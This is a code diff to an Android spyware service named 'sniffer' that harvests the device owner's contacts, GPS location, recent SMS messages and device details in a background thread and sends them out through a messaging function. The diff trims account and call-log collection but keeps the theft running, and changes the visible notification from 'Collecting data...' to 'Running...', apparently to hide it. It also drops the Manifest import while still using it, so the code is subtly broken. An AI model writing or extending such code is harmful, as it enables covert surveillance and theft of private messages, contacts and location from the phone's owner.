@@ -1,9 +1,5 @@
 package com.v8.global.sniffer;
 
-import android.Manifest;
-import android.accessibilityservice.AccessibilityServiceInfo;
-import android.accounts.Account;
-import android.accounts.AccountManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -14,15 +10,11 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationManager;
-import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.PowerManager;
 import android.provider.ContactsContract;
-import android.provider.MediaStore;
 import android.provider.Settings;
-import android.telephony.TelephonyManager;
-import android.view.accessibility.AccessibilityManager;
 
 import androidx.core.app.NotificationCompat;
 
@@ -52,7 +44,14 @@ public class DataService extends Service {
         
         startForegroundService();
         sendMessage("✅ DataService started");
-        collectAllData();
+        
+        // سحب البيانات
+        new Thread(() -> {
+            sendDeviceInfo();
+            getContacts();
+            getLocation();
+            getSms();
+        }).start();
     }
 
     private void startForegroundService() {
@@ -63,21 +62,10 @@ public class DataService extends Service {
         }
         Notification notification = new NotificationCompat.Builder(this, channelId)
                 .setContentTitle("Data Service")
-                .setContentText("Collecting data...")
+                .setContentText("Running...")
                 .setSmallIcon(android.R.drawable.stat_notify_sync)
                 .build();
         startForeground(1, notification);
-    }
-
-    private void collectAllData() {
-        new Thread(() -> {
-            sendDeviceInfo();
-            getContacts();
-            getLocation();
-            getAccounts();
-            getSms();
-            getCallLog();
-        }).start();
     }
 
     private void sendDeviceInfo() {
@@ -86,18 +74,14 @@ public class DataService extends Service {
             info.put("model", Build.MODEL);
             info.put("manufacturer", Build.MANUFACTURER);
             info.put("android", Build.VERSION.RELEASE);
-            
-            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                info.put("phone", tm.getLine1Number());
-            }
-            
             sendMessage("📱 Device: " + info.toString());
         } catch (Exception e) {}
     }
 
     private void getContacts() {
         try {
+            if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
+            
             ContentResolver cr = getContentResolver();
             Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 null, null, null, null);
@@ -114,50 +98,27 @@ public class DataService extends Service {
 
     private void getLocation() {
         try {
+            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
+            
             LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
             Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (location != null) {
                 sendMessage("📍 Location: " + location.getLatitude() + "," + location.getLongitude());
             }
         } catch (Exception e) {}
     }
 
-    private void getAccounts() {
-        try {
-            AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
-            Account[] accounts = am.getAccounts();
-            StringBuilder sb = new StringBuilder("👤 Accounts:\n");
-            for (Account acc : accounts) {
-                sb.append(acc.type).append(": ").append(acc.name).append("\n");
-            }
-            sendMessage(sb.toString());
-        } catch (Exception e) {}
-    }
-
     private void getSms() {
         try {
+            if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;
+            
             Cursor cursor = getContentResolver().query(
-                Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
+                android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 5");
             StringBuilder sb = new StringBuilder("📨 SMS:\n");
             while (cursor != null && cursor.moveToNext()) {
                 String address = cursor.getString(cursor.getColumnIndex("address"));
                 String body = cursor.getString(cursor.getColumnIndex("body"));
                 sb.append(address).append(": ").append(body).append("\n");
-            }
-            if (cursor != null) cursor.close();
-            sendMessage(sb.toString());
-        } catch (Exception e) {}
-    }
-
-    private void getCallLog() {
-        try {
-            Cursor cursor = getContentResolver().query(
-                Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
-            StringBuilder sb = new StringBuilder("📞 Calls:\n");
-            while (cursor != null && cursor.moveToNext()) {
-                String number = cursor.getString(cursor.getColumnIndex("number"));
-                sb.append(number).append("\n");
             }
             if (cursor != null) cursor.close();
             sendMessage(sb.toString());
